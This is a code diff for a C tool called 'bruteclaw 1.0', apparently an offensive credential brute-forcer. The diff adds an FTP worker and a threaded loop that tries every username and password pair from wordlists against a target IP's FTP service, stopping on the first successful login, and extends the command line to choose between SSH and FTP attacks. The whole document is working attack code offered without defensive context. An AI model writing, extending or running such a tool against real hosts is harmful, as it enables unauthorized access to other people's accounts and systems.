@@ -1,4 +1,5 @@
 #include "../../lib/sshlib.h"
+#include "../../lib/ftplib.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -28,6 +29,23 @@ void *SSHWorker(void *arg) {
         pthread_exit(NULL);
     }
 }
+
+// FTP worker
+void *FTPWorker(void *arg) {
+    BruteJob *job = (BruteJob *)arg;
+
+    FTPConnection *conn = ftpConnect(job->ip, 21, job->username, job->password);
+    if (conn) {
+        printf("[+] Success: %s:%s\n", job->username, job->password);
+        ftpDisconnect(conn);
+        exit(0); // Kill all on first success
+    } else {
+        // Failure somewhere in this thread, close the thread
+        printf("[-] Failed: %s:%s\n", job->username, job->password);
+        pthread_exit(NULL);
+    }
+}
+
 // Brute force SSH function
 void bruteForceSSH(const char *targetIP, const char *usernameFilename, const char *passwordFilename) {
     printf("[*] Starting SSH brute force\n");
@@ -85,23 +103,79 @@ void bruteForceSSH(const char *targetIP, const char *usernameFilename, const cha
     printf("[-] Brute complete, no creds found.\n");
 }
 
-// FTP worker
-void FTPWorker(void *arg) {
-    BruteJob *job = (BruteJob *)arg;
-}
 // Main FTP brute force function
+void bruteForceFTP(const char *targetIP, const char *usernameFilename, const char *passwordFilename) {
+    printf("[*] Starting FTP brute force\n");
+
+    FILE *usernameFile = fopen(usernameFilename, "r");
+    FILE *passwordFile = fopen(passwordFilename, "r");
+
+    if (!usernameFile || !passwordFile) {
+        fprintf(stderr, "[-] Failed to open user or password file\n");
+        return;
+    }
+
+    char currentUsername[128];
+    pthread_t threads[MAX_THREADS];
+    int threadIndex = 0;
+
+    while (fgets(currentUsername, sizeof(currentUsername), usernameFile) != NULL) {
+        strtok(currentUsername, "\n");
+
+        rewind(passwordFile);
+        char currentPassword[128];
+
+        // Internal loop for each password
+        while (fgets(currentPassword, sizeof(currentPassword), passwordFile) != NULL) {
+            strtok(currentPassword, "\n");
+
+            // setup job
+            BruteJob *job = malloc(sizeof(BruteJob));
+            strncpy(job->ip, targetIP, sizeof(job->ip));
+            strncpy(job->username, currentUsername, sizeof(job->username));
+            strncpy(job->password, currentPassword, sizeof(job->password));
+
+            // launch thread
+            pthread_create(&threads[threadIndex], NULL, FTPWorker, (void *)job);
+            threadIndex++;
+
+            // thread pool limiting
+            if (threadIndex >= MAX_THREADS) {
+                for (int i = 0; i < threadIndex; i++) {
+                    pthread_join(threads[i], NULL);
+                }
+                threadIndex = 0;
+            }
+        }
+    }
+
+    // Wait for leftovers
+    for (int i = 0; i < threadIndex; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    fclose(usernameFile);
+    fclose(passwordFile);
+
+    printf("[-] Brute complete, no creds found.\n");
+}
 
 // Entry point and argument handling
 int main(int argc, char *argv[]) {
     printf("[*] Starting bruteclaw 1.0\n");
 
     if (argc < 5) {
-        printf("Usage: ./bruteclaw <IP> <Username file> <Password file> ssh\n");
+        printf("Usage: ./bruteclaw <IP> <Username file> <Password file> <ssh|ftp>\n");
         return 1;
     }
 
     if (strcmp(argv[4], "ssh") == 0) {
         bruteForceSSH(argv[1], argv[2], argv[3]);
+    } else if (strcmp(argv[4], "ftp") == 0) {
+        bruteForceFTP(argv[1], argv[2], argv[3]);
+    } else {
+        printf("[-] Invalid protocol. Use 'ssh' or 'ftp'\n");
+        return 1;
     }
 
     return 0;
